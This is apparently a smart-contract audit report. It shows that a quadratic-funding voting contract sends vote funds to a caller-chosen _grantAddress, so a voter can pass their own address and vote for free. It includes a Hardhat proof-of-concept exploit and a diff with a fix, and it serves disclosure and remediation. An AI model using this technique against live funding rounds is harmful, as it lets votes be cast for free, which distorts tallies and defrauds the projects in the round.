# Vote without paying for the votes using _grantAddress

## Summary
The QuadraticFundingVotingStrategyImplementation contract sends back to _grantAddress the ETH or tokens used to vote.
The user can use his own address as _grantAddress and vote without paying anything.

## Vulnerability Detail
When a user votes, it sends the encodedVotes as a parameter and this encodedVotes has a variable called _grantAddress. This _grantAddress is not needed because encodedVotes already has the projectID.

Therefore, a malicius user could use his own address as _granAddress or another address of his own. In this way, the contract will emit a Voted event and send back the ETH or tokens to the malicius user.

Although the votes are not calculated on-chain, the operators in charge of computing the votes will have the extra job of looking to see if a malicius user employed this maneuver to vote.

**Proof of concept:**
 ```typescript
  expect(await MockERC20.balanceOf(player.address)).to.equal(1_000_000);

  await MockERC20.connect(player).approve(votingStrategyContract.address, 1_000_000);
  const voteTx = await round.connect(player).vote([ethers.utils.defaultAbiCoder.encode(
      ["address", "uint256", "address", "bytes32"],
      [
          MockERC20.address,
          1_000_000,
          // Here goes the _grantAddress
          player.address,
          ethers.utils.hexZeroPad(projectID.toHexString(), 32),
      ]
  )]);

  await expect(voteTx).to.emit(
      votingStrategy, 'Voted'
  ).withArgs(
      MockERC20.address,
      1_000_000,
      player.address,
      // This is the _grantAddress
      player.address,
      projectID,
      round.address
  );

  expect(await MockERC20.balanceOf(player.address)).to.equal(1_000_000);
  expect(await MockERC20.balanceOf(round.address)).to.equal(0);
  expect(await MockERC20.balanceOf(votingStrategyContract.address)).to.equal(0);
```


## Impact
A malicius user can vote for a project they want to win, without paying anything and messing up the vote count.

## Tool used

Manual Review, Hardhat

## Recommendation
The contract in charge of distributing the money among the winning projects is not this contract but the PayoutStrategy contract.

Remove the use of _grantAddress and send the ETH or tokens to the Round contract, which will send the money to the PayoutStrategy contract when the round ends.

The variable roundAddress is inside the QuadraticFundingVotingStrategyImplementation contract because it inherits from IVotingStrategy.

```solidity
function vote(bytes[] calldata encodedVotes, address voterAddress) external override payable nonReentrant isRoundContract {

    for (uint256 i = 0; i < encodedVotes.length; i++) {

      (
        address _token,
        uint256 _amount,
-       address _grantAddress,
        bytes32 _projectId
      ) = abi.decode(encodedVotes[i], (
        address,
        uint256,
-       address,
        bytes32
      ));

      if (_token == address(0)) {
-       AddressUpgradeable.sendValue(payable(_grantAddress), _amount);
+       AddressUpgradeable.sendValue(payable(roundAddress), _amount);
      } else {
        SafeERC20Upgradeable.safeTransferFrom(
          IERC20Upgradeable(_token),
          voterAddress,
-         _grantAddress,
+         roundAddress,
          _amount
        );

      }

      emit Voted(
        _token,
        _amount,
        voterAddress,
-       _granAddress,
+       roundAddress,
        _projectId,
        msg.sender
      );

    }
  }
